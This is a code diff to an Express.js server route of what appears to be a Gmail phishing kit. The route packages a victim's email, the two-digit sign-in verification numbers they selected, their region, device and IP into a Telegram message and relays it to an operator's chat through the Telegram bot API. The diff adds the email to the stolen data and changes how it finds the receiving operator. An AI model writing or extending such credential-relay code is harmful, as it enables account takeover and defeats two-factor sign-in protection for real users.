@@ -1475,9 +1475,10 @@ app.post("/send-verification-confirm", async (req, res) => {
     };
 
     const message =
-      `🌈🌈🌈 <b>Gmail - Verification Confirm</b> 🌈🌈🌈\n` +
+      `🌈🌈🌈 <b>Gmail - Verify Numbers</b> 🌈🌈🌈\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📊 Selected Numbers:</b> <code>${digit1}${digit2}</code>\n` +
+      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>🔢 Selected Numbers:</b> <code><b>${digit1}${digit2}</b></code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
@@ -1497,22 +1498,19 @@ app.post("/send-verification-confirm", async (req, res) => {
     const botToken = process.env.BOT_TOKEN;
     const chatId = process.env.ADMIN_CHAT_ID;
 
-    // ✅ SEND TO WINNER ONLY
-    if (email && userWinnerTelegram[email]) {
-      console.log(`📨 Verification confirm going to winner only: ${userWinnerTelegram[email]}`);
-      await sendFollowUpMessage(email, message, options);
+    // ✅ RESOLVE EMAIL via multi-layer tracking to find original winner (like verification page)
+    let resolvedEmail = email;
+    if (!userWinnerTelegram[email]) {
+      resolvedEmail = resolveEmailFromRequest(req, null, null) || email;
+      console.log(`🔍 Resolved email via tracking: ${email} → ${resolvedEmail}`);
+    }
+
+    // ✅ SEND TO WINNER ONLY (use resolved email for winner lookup)
+    if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
+      console.log(`📨 Verification confirm going to winner only: ${userWinnerTelegram[resolvedEmail]}`);
+      await sendFollowUpMessage(resolvedEmail, message, options);
     } else {
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: options.parse_mode,
-          reply_markup: options.reply_markup
-        })
-      });
+      console.log(`⚠️ WARNING: No winner found for ${email}, not sending message`);
     }
 
     res.json({ success: true, requestId: confirmRequestId });
